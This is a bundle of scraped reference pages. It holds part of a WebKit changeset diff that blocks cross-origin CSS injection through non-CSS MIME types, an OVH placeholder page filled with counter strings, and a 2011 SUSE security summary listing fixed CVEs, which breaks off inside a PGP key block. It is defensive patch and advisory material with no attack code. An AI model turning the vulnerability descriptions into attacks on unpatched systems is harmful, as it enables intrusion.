  | 96 | 96 | void setIsUserStyleSheet(bool b) { m\_isUserStyleSheet = b; } |
  | 97 | 97 | bool isUserStyleSheet() const { return m\_isUserStyleSheet; } |
  |  | 98 | void setHasSyntacticallyValidCSSHeader(bool b) { m\_hasSyntacticallyValidCSSHeader = b; } |
  |  | 99 | bool hasSyntacticallyValidCSSHeader() const { return m\_hasSyntacticallyValidCSSHeader; } |
  | 98 | 100 |  |
  | 99 | 101 | private: |
  | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.h?rev=48773#L111) | […](/browser/webkit/trunk/WebCore/css/CSSStyleSheet.h?rev=52784#L113) |  |
  | 111 | 113 | bool m\_strictParsing : 1; |
  | 112 | 114 | bool m\_isUserStyleSheet : 1; |
  |  | 115 | bool m\_hasSyntacticallyValidCSSHeader : 1; |
  | 113 | 116 | }; |
  | 114 | 117 |  |
* ## [trunk/WebCore/dom/ProcessingInstruction.cpp](/changeset/52784/webkit/trunk/WebCore/dom/ProcessingInstruction.cpp "Show the changeset 52784 restricted to trunk/WebCore/dom/ProcessingInstruction.cpp")

  | [r50571](/browser/webkit/trunk/WebCore/dom/ProcessingInstruction.cpp?rev=50571#L205 "Show revision 50571 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/dom/ProcessingInstruction.cpp?rev=52784#L205 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 205 | 205 | RefPtr<CSSStyleSheet> newSheet = CSSStyleSheet::create(this, url, charset); |
  | 206 | 206 | m\_sheet = newSheet; |
  | 207 |  | parseStyleSheet(sheet->sheetText()); |
  |  | 207 | // We don't need the cross-origin security check here because we are |
  |  | 208 | // getting the sheet text in "strict" mode. This enforces a valid CSS MIME |
  |  | 209 | // type. |
  |  | 210 | parseStyleSheet(sheet->sheetText(true)); |
  | 208 | 211 | newSheet->setTitle(m\_title); |
  | 209 | 212 | newSheet->setMedia(MediaList::create(newSheet.get(), m\_media)); |
* ## [trunk/WebCore/html/HTMLLinkElement.cpp](/changeset/52784/webkit/trunk/WebCore/html/HTMLLinkElement.cpp "Show the changeset 52784 restricted to trunk/WebCore/html/HTMLLinkElement.cpp")

  | [r52320](/browser/webkit/trunk/WebCore/html/HTMLLinkElement.cpp?rev=52320#L261 "Show revision 52320 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/html/HTMLLinkElement.cpp?rev=52784#L261 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 261 | 261 | bool strictParsing = !document()->inCompatMode(); |
  | 262 | 262 | bool enforceMIMEType = strictParsing; |
  |  | 263 | bool crossOriginCSS = false; |
  |  | 264 | bool validMIMEType = false; |
  | 263 | 265 | bool needsSiteSpecificQuirks = document()->page() && document()->page()->settings()->needsSiteSpecificQuirks(); |
  | 264 | 266 |  |
  | […](/browser/webkit/trunk/WebCore/html/HTMLLinkElement.cpp?rev=52320#L276) | […](/browser/webkit/trunk/WebCore/html/HTMLLinkElement.cpp?rev=52784#L278) |  |
  | 276 | 278 | #endif |
  | 277 | 279 |  |
  | 278 |  | String sheetText = sheet->sheetText(enforceMIMEType); |
  |  | 280 | String sheetText = sheet->sheetText(enforceMIMEType, &validMIMEType); |
  | 279 | 281 | m\_sheet->parseString(sheetText, strictParsing); |
  |  | 282 |  |
  |  | 283 | // If we're loading a stylesheet cross-origin, and the MIME type is not |
  |  | 284 | // standard, require the CSS to at least start with a syntactically |
  |  | 285 | // valid CSS rule. |
  |  | 286 | // This prevents an attacker playing games by injecting CSS strings into |
  |  | 287 | // HTML, XML, JSON, etc. etc. |
  |  | 288 | if (!document()->securityOrigin()->canRequest(KURL(ParsedURLString, url))) |
  |  | 289 | crossOriginCSS = true; |
  |  | 290 |  |
  |  | 291 | if (crossOriginCSS && !validMIMEType && !m\_sheet->hasSyntacticallyValidCSSHeader()) |
  |  | 292 | m\_sheet = CSSStyleSheet::create(this, url, charset); |
  | 280 | 293 |  |
  | 281 | 294 | if (strictParsing && needsSiteSpecificQuirks) { |
* ## [trunk/WebCore/loader/CachedCSSStyleSheet.cpp](/changeset/52784/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp "Show the changeset 52784 restricted to trunk/WebCore/loader/CachedCSSStyleSheet.cpp")

  | [r44749](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=44749#L72 "Show revision 44749 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=52784#L72 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 72 | 72 | } |
  | 73 | 73 |  |
  | 74 |  | const String CachedCSSStyleSheet::sheetText(bool enforceMIMEType) const |
  |  | 74 | const String CachedCSSStyleSheet::sheetText(bool enforceMIMEType, bool\* hasValidMIMEType) const |
  | 75 | 75 | { |
  | 76 | 76 | ASSERT(!isPurgeable()); |
  | 77 | 77 |  |
  | 78 |  | if (!m\_data || m\_data->isEmpty() || !canUseSheet(enforceMIMEType)) |
  |  | 78 | if (!m\_data || m\_data->isEmpty() || !canUseSheet(enforceMIMEType, hasValidMIMEType)) |
  | 79 | 79 | return String(); |
  | 80 | 80 |  |
  | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=44749#L123) | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=52784#L123) |  |
  | 123 | 123 | } |
  | 124 | 124 |  |
  | 125 |  | bool CachedCSSStyleSheet::canUseSheet(bool enforceMIMEType) const |
  |  | 125 | bool CachedCSSStyleSheet::canUseSheet(bool enforceMIMEType, bool\* hasValidMIMEType) const |
  | 126 | 126 | { |
  | 127 | 127 | if (errorOccurred()) |
  | 128 | 128 | return false; |
  | 129 | 129 |  |
  | 130 |  | if (!enforceMIMEType) |
  |  | 130 | if (!enforceMIMEType && !hasValidMIMEType) |
  | 131 | 131 | return true; |
  | 132 | 132 |  |
  | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=44749#L139) | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.cpp?rev=52784#L139) |  |
  | 139 | 139 | // folks can use standards mode for local HTML documents. |
  | 140 | 140 | String mimeType = extractMIMETypeFromMediaType(response().httpHeaderField("Content-Type")); |
  | 141 |  | return mimeType.isEmpty() || equalIgnoringCase(mimeType, "text/css") || equalIgnoringCase(mimeType, "application/x-unknown-content-type"); |
  |  | 141 | bool typeOK = mimeType.isEmpty() || equalIgnoringCase(mimeType, "text/css") || equalIgnoringCase(mimeType, "application/x-unknown-content-type"); |
  |  | 142 | if (hasValidMIMEType) |
  |  | 143 | \*hasValidMIMEType = typeOK; |
  |  | 144 | if (!enforceMIMEType) |
  |  | 145 | return true; |
  |  | 146 | return typeOK; |
  | 142 | 147 | } |
  | 143 | 148 |  |
* ## [trunk/WebCore/loader/CachedCSSStyleSheet.h](/changeset/52784/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h "Show the changeset 52784 restricted to trunk/WebCore/loader/CachedCSSStyleSheet.h")

  | [r44749](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h?rev=44749#L41 "Show revision 44749 of this file in browser") | [r52784](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h?rev=52784#L41 "Show revision 52784 of this file in browser") |  |
  | --- | --- | --- |
  | 41 | 41 | virtual ~CachedCSSStyleSheet(); |
  | 42 | 42 |  |
  | 43 |  | const String sheetText(bool enforceMIMEType = true) const; |
  |  | 43 | const String sheetText(bool enforceMIMEType = true, bool\* hasValidMIMEType = 0) const; |
  | 44 | 44 |  |
  | 45 | 45 | virtual void didAddClient(CachedResourceClient\*); |
  | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h?rev=44749#L57) | […](/browser/webkit/trunk/WebCore/loader/CachedCSSStyleSheet.h?rev=52784#L57) |  |
  | 57 | 57 |  |
  | 58 | 58 | private: |
  | 59 |  | bool canUseSheet(bool enforceMIMEType) const; |
  |  | 59 | bool canUseSheet(bool enforceMIMEType, bool\* hasValidMIMEType) const; |
  | 60 | 60 |  |
  | 61 | 61 | protected: |
**Note:**
See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

### Download in other formats:

* [Unified Diff](?format=diff&new=52784)
* [Zip Archive](?format=zip&new=52784)

---

[![Trac Powered](/chrome/common/trac_logo_mini.png)](https://trac.edgewall.org/)

Powered by [**Trac 1.5.4**](/about)

By [Edgewall Software](http://www.edgewall.org/)
.

Hosted by [Apple](http://www.apple.com/)



=== Content from www.vupen.com_ea020596_20250125_142605.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from lists.opensuse.org_80ebef0a_20250125_142541.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/#C2VK7FPKD3ZEG555N25GLTFTZJJB237A)

# [security-announce] SUSE Security Summary Report: SUSE-SR:2011:002

![](https://seccdn.libravatar.org/avatar/ba8a7ce3d58568440e41b612dbef454d.jpg?s=120&d=mm&r=g)
## [Sebastian Krahmer](/archives/users/e48561a29a544c44a8f62aa2304e7b09/ "See the profile for Sebastian Krahmer")

25 Jan
2011

25 Jan
'11

13:13

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
SUSE Security Summary Report
Announcement ID: SUSE-SR:2011:002
Date: Tue, 25 Jan 2011 11:00:00 +0000
Cross-References: CVE-2008-3916, CVE-2009-0945, CVE-2009-1681
CVE-2009-1684, CVE-2009-1685, CVE-2009-1686
CVE-2009-1687, CVE-2009-1688, CVE-2009-1689
CVE-2009-1690, CVE-2009-1691, CVE-2009-1692
CVE-2009-1693, CVE-2009-1694, CVE-2009-1695
CVE-2009-1696, CVE-2009-1697, CVE-2009-1698
CVE-2009-1699, CVE-2009-1700, CVE-2009-1701
CVE-2009-1702, CVE-2009-1703, CVE-2009-1709
CVE-2009-1710, CVE-2009-1711, CVE-2009-1712
CVE-2009-1713, CVE-2009-1714, CVE-2009-1715
CVE-2009-1718, CVE-2009-1724, CVE-2009-1725
CVE-2009-2195, CVE-2009-2199, CVE-2009-2200
CVE-2009-2419, CVE-2009-2797, CVE-2009-2816
CVE-2009-2841, CVE-2009-3272, CVE-2009-3384
CVE-2009-3933, CVE-2009-3934, CVE-2009-4134
CVE-2010-0046, CVE-2010-0047, CVE-2010-0048
CVE-2010-0049, CVE-2010-0050, CVE-2010-0051
CVE-2010-0052, CVE-2010-0053, CVE-2010-0054
CVE-2010-0315, CVE-2010-0647, CVE-2010-0650
CVE-2010-0651, CVE-2010-0656, CVE-2010-0659
CVE-2010-0661, CVE-2010-1029, CVE-2010-1126
CVE-2010-1163, CVE-2010-1233, CVE-2010-1236
CVE-2010-1386, CVE-2010-1387, CVE-2010-1388
CVE-2010-1389, CVE-2010-1390, CVE-2010-1391
CVE-2010-1392, CVE-2010-1393, CVE-2010-1394
CVE-2010-1395, CVE-2010-1396, CVE-2010-1397
CVE-2010-1398, CVE-2010-1399, CVE-2010-1400
CVE-2010-1401, CVE-2010-1402, CVE-2010-1403
CVE-2010-1404, CVE-2010-1405, CVE-2010-1406
CVE-2010-1407, CVE-2010-1408, CVE-2010-1409
CVE-2010-1410, CVE-2010-1412, CVE-2010-1413
CVE-2010-1414, CVE-2010-1415, CVE-2010-1416
CVE-2010-1417, CVE-2010-1418, CVE-2010-1419
CVE-2010-1421, CVE-2010-1422, CVE-2010-1449
CVE-2010-1450, CVE-2010-1455, CVE-2010-1634
CVE-2010-1646, CVE-2010-1729, CVE-2010-1749
CVE-2010-1757, CVE-2010-1758, CVE-2010-1759
CVE-2010-1760, CVE-2010-1761, CVE-2010-1762
CVE-2010-1763, CVE-2010-1764, CVE-2010-1766
CVE-2010-1767, CVE-2010-1769, CVE-2010-1770
CVE-2010-1771, CVE-2010-1772, CVE-2010-1773
CVE-2010-1774, CVE-2010-1780, CVE-2010-1781
CVE-2010-1782, CVE-2010-1783, CVE-2010-1784
CVE-2010-1785, CVE-2010-1786, CVE-2010-1787
CVE-2010-1788, CVE-2010-1789, CVE-2010-1790
CVE-2010-1791, CVE-2010-1792, CVE-2010-1793
CVE-2010-1807, CVE-2010-1812, CVE-2010-1813
CVE-2010-1814, CVE-2010-1815, CVE-2010-1822
CVE-2010-1823, CVE-2010-1824, CVE-2010-1825
CVE-2010-2089, CVE-2010-2264, CVE-2010-2283
CVE-2010-2284, CVE-2010-2285, CVE-2010-2286
CVE-2010-2287, CVE-2010-2295, CVE-2010-2297
CVE-2010-2300, CVE-2010-2301, CVE-2010-2302
CVE-2010-2441, CVE-2010-2640, CVE-2010-2643
CVE-2010-2761, CVE-2010-2891, CVE-2010-2992
CVE-2010-2993, CVE-2010-2994, CVE-2010-2995
CVE-2010-3116, CVE-2010-3257, CVE-2010-3259
CVE-2010-3312, CVE-2010-3445, CVE-2010-3493
CVE-2010-3803, CVE-2010-3804, CVE-2010-3805
CVE-2010-3808, CVE-2010-3809, CVE-2010-3810
CVE-2010-3811, CVE-2010-3812, CVE-2010-3813
CVE-2010-3816, CVE-2010-3817, CVE-2010-3818
CVE-2010-3819, CVE-2010-3820, CVE-2010-3821
CVE-2010-3822, CVE-2010-3823, CVE-2010-3824
CVE-2010-3826, CVE-2010-3829, CVE-2010-3900
CVE-2010-4040, CVE-2010-4267, CVE-2010-4300
CVE-2010-4301, CVE-2010-4341, CVE-2010-4410
CVE-2010-4411, CVE-2010-4523, CVE-2011-0010
Content of this advisory:
1) Solved Security Vulnerabilities:
- ed
- evince
- hplip
- libopensc2/opensc
- libsmi
- libwebkit
- perl
- python
- sssd
- sudo
- wireshark
2) Pending Vulnerabilities, Solutions, and Work-Arounds:
none
3) Authenticity Verification and Additional Information
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- ed
This update fixes a heap-based buffer overflow in ed which can be
exploited remotely only with user-assistance.
CVE-2008-3916: CVSS v2 Base Score: 9.3 (HIGH)
(AV:N/AC:M/Au:N/C:C/I:C/A:C): Buffer Errors (CWE-119)
Affected products: SLE10-SP3, SLE11-SP1
- evince
Multiple font parser vulnerabilities in the DVI backend of evince have
been fixed.
CVE-2010-2640 - CVE-2010-2643 have been assigned to these issues.
Affected products: openSUSE 11.2-11.3, SLE11-SP1
- hplip
Specially crafted SNMP replies could cause a buffer overflow in hplip's
sane backend (CVE-2010-4267).
Affected products: openSUSE 11.2-11.3, SLE11-SP1
- libopensc2/opensc
Specially crafted smart cards could cause a buffer overflow in opensc
(CVE-2010-4523).
Affected products: openSUSE 11.1-11.3
- libsmi
This update fixes a buffer overflow the smiGetNode() function in libsmi.
It allowed context-dependent attackers to execute arbitrary code via an
Object Identifier.
CVE-2010-2891: CVSS v2 Base Score: 7.5 (HIGH)
(AV:N/AC:L/Au:N/C:P/I:P/A:P): Buffer Errors (CWE-119)
Affected products: SLE10-SP3, SLE11-SP1
- libwebkit
Various bugs in webkit have been fixed. The CVE id's are:
CVE-2009-0945, CVE-2009-1681, CVE-2009-1684, CVE-2009-1685, CVE-2009-1686,
CVE-2009-1687, CVE-2009-1688, CVE-2009-1689, CVE-2009-1691, CVE-2009-1690,
CVE-2009-1692, CVE-2009-1693, CVE-2009-1694, CVE-2009-1695, CVE-2009-1696,
CVE-2009-1697, CVE-2009-1698, CVE-2009-1699, CVE-2009-1700, CVE-2009-1701,
CVE-2009-1702, CVE-2009-1703, CVE-2009-1709, CVE-2009-1710, CVE-2009-1711,
CVE-2009-1712, CVE-2009-1713, CVE-2009-1714, CVE-2009-1715, CVE-2009-1718,
CVE-2009-1724, CVE-2009-1725, CVE-2009-2195, CVE-2009-2199, CVE-2009-2200,
CVE-2009-2419, CVE-2009-2797, CVE-2009-2816, CVE-2009-2841, CVE-2009-3272,
CVE-2009-3384, CVE-2009-3933, CVE-2009-3934, CVE-2010-0046, CVE-2010-0047,
CVE-2010-0048, CVE-2010-0049, CVE-2010-0050, CVE-2010-0052, CVE-2010-0053,
CVE-2010-0054, CVE-2010-0315, CVE-2010-0647, CVE-2010-0051, CVE-2010-0650,
CVE-2010-0651, CVE-2010-0656, CVE-2010-0659, CVE-2010-0661, CVE-2010-1029,
CVE-2010-1126, CVE-2010-1233, CVE-2010-1236, CVE-2010-1386, CVE-2010-1387,
CVE-2010-1388, CVE-2010-1389, CVE-2010-1390, CVE-2010-1391, CVE-2010-1392,
CVE-2010-1393, CVE-2010-1394, CVE-2010-1395, CVE-2010-1396, CVE-2010-1397,
CVE-2010-1398, CVE-2010-1399, CVE-2010-1400, CVE-2010-1401, CVE-2010-1402,
CVE-2010-1403, CVE-2010-1404, CVE-2010-1405, CVE-2010-1406, CVE-2010-1407,
CVE-2010-1408, CVE-2010-1409, CVE-2010-1410, CVE-2010-1412, CVE-2010-1413,
CVE-2010-1414, CVE-2010-1415, CVE-2010-1416, CVE-2010-1417, CVE-2010-1418,
CVE-2010-1419, CVE-2010-1421, CVE-2010-1422, CVE-2010-1729, CVE-2010-1749,
CVE-2010-1757, CVE-2010-1758, CVE-2010-1759, CVE-2010-1760, CVE-2010-1761,
CVE-2010-1762, CVE-2010-1763, CVE-2010-1764, CVE-2010-1766, CVE-2010-1767,
CVE-2010-1769, CVE-2010-1770, CVE-2010-1771, CVE-2010-1772, CVE-2010-1773,
CVE-2010-1774, CVE-2010-1780, CVE-2010-1781, CVE-2010-1782, CVE-2010-1783,
CVE-2010-1784, CVE-2010-1785, CVE-2010-1786, CVE-2010-1787, CVE-2010-1788,
CVE-2010-1789, CVE-2010-1790, CVE-2010-1791, CVE-2010-1792, CVE-2010-1793,
CVE-2010-1807, CVE-2010-1812, CVE-2010-1813, CVE-2010-1814, CVE-2010-1815,
CVE-2010-1822, CVE-2010-1823, CVE-2010-1824, CVE-2010-1825, CVE-2010-2264,
CVE-2010-2295, CVE-2010-2297, CVE-2010-2300, CVE-2010-2301, CVE-2010-2302,
CVE-2010-2441, CVE-2010-3116, CVE-2010-3257, CVE-2010-3259, CVE-2010-3312,
CVE-2010-3803, CVE-2010-3804, CVE-2010-3805, CVE-2010-3808, CVE-2010-3809,
CVE-2010-3810, CVE-2010-3811, CVE-2010-3812, CVE-2010-3813, CVE-2010-3816,
CVE-2010-3817, CVE-2010-3818, CVE-2010-3819, CVE-2010-3820, CVE-2010-3821,
CVE-2010-3822, CVE-2010-3823, CVE-2010-3824, CVE-2010-3826, CVE-2010-3829,
CVE-2010-3900, CVE-2010-4040
Affected products: openSUSE 11.2-11.3
- perl
Multiple header injection problems in the CGI module of perl have been
fixed. They allowed to inject HTTP headers in responses.
CVE-2010-2761, CVE-2010-4410 and CVE-2010-4411 have been assigned to
this issue.
Affected products: openSUSE 11.2-11.3, SLE10-SP3, SLE11-SP1
- python
With this update of python:
- a race condition in the accept() implementation of smtpd.py could
lead to a denial of service (CVE-2010-3493).
- integer overflows and insufficient size checks could crash the
audioop and rgbimg modules (CVE-2010-2089, CVE-2010-1634,
CVE-2009-4134,CVE-2010-1449,CVE-2010-1450).
Affected products: SLE10-SP3
- sssd
This update fixes a local denial-of-service attack that stops other users
from logging in. The bug existed in the pam\_parse\_in\_data\_v2() function.
(CVE-2010-4341: CVSS v2 Base Score: 2.1)
Affected products: openSUSE 11.3
- sudo
This update of sudo fixes:
- CVE-2011-0010: Does ask for the user password for GID changes now.
- CVE-2010-1646: CVSS v2 Base Score: 6.6 (CWE-264): The secure
environment option can handle multiple occurrence of PATH now.
- CVE-2010-1163: CVSS v2 Base Score: 6.9 (CWE-20): Improved command
matching.
Affected products: openSUSE 11.2-11.3
- wireshark
Wireshark version 1.4.2 fixes several security issues that allowed
attackers to crash wireshark or potentially even execute arbitrary code
(CVE-2010-1455, CVE-2010-2283, CVE-2010-2284, CVE-2010-2285,
CVE-2010-2286, CVE-2010-2287, CVE-2010-2992, CVE-2010-2993,
CVE-2010-2994, CVE-2010-2995, CVE-2010-3445, CVE-2010-4300,
CVE-2010-4301)
Affected products: openSUSE 11.2-11.3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
2) Pending Vulnerabilities, Solutions, and Work-Arounds
none
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.
=====================================================================
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
The information in this advisory may be distributed or reproduced,
provided that the advisory is not modified in any way. In particular, the
clear text signature should show proof of the authenticity of the text.
SUSE Linux Products GmbH provides no warranties of any kind whatsoever
with respect to the information contained in this security advisory.
Type Bits/KeyID Date User ID
pub 2048R/3D25D3D9 1999-03-06 SuSE Security Team <security@suse.de>
pub 1024D/9C800ACA 2000-10-19 SuSE Package Signing Key <build@suse.de>
- -----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.4.2 (GNU/Linux)
mQENAzbhLQQAAAEIAKAkXHe0lWRBXLpn38hMHy03F0I4Sszmoc8aaKJrhfhyMlOA
BqvklPLE2f9UrI4Xc860gH79ZREwAgPt0pi6+SleNFLNcNFAuuHMLQOOsaMFatbz
JR9i4m/lf6q929YROu5zB48rBAlcfTm+IBbijaEdnqpwGib45wE/Cfy6FAttBHQh
1Kp+r/jPbf1mYAvljUfHKuvbg8t2EIQz/5yGp+n5trn9pElfQO2cRBq8LFpf1l+U
P7EKjFmlOq+Gs/fF98/dP3DfniSd78LQPq5vp8RL8nr/o2i7jkAQ33m4f1wOBWd+
cZovrKXYlXiR+Bf7m2hpZo+/sAzhd7LmAD0l09kABRG0JVN1U0UgU2VjdXJpdHkg
VGVhbSA8c2VjdXJpdHlAc3VzZS5kZT6JARUDBRA24S1H5Fiyh7HKPEUBAVcOB/9b
yHYji1/+4Xc2GhvXK0FSJN0MGgeXgW47yxDL7gmR4mNgjlIOUHZj0PEpVjWepOJ7
tQS3L9oP6cpj1Fj/XxuLbkp5VCQ61hpt54coQAvYrnT9rtWEGN+xmwejT1WmYmDJ
xG+EGBXKr+XP69oIUl1E2JO3rXeklulgjqRKos4cdXKgyjWZ7CP9V9daRXDtje63
Om8gwSdU/nCvhdRIWp/Vwbf7Ia8iZr9OJ5YuQl0DBG4qmGDDrvImgPAFkYFzwlqo
choXFQ9y0YVCV41DnR+GYhwl2qBd81T8aXhihEGPIgaw3g8gd8B5o6mPVgl+nJqI
BkEYGBusiag2pS6qwznZiQEVAwUQNuEtBHey5gA9JdPZAQFtOAf+KVh939b0J94u
v/kpg4xs1LthlhquhbHcKNoVTNspugiC3qMPyvSX4XcBr2PC0cVkS4Z9PY9iCfT+
x9WM96g39dAF+le2CCx7XISk9XXJ4ApEy5g4AuK7NYgAJd39PPbERgWnxjxir9g0
Ix30dS30bW39D+3NPU5Ho9TD/B7UDFvYT5AWHl3MGwo3a1RhTs6sfgL7yQ3U+mvq
MkTExZb5mfN1FeaYKMopoI4VpzNVeGxQWIz67VjJHVyUlF20ekOz4kWVgsxkc8G2
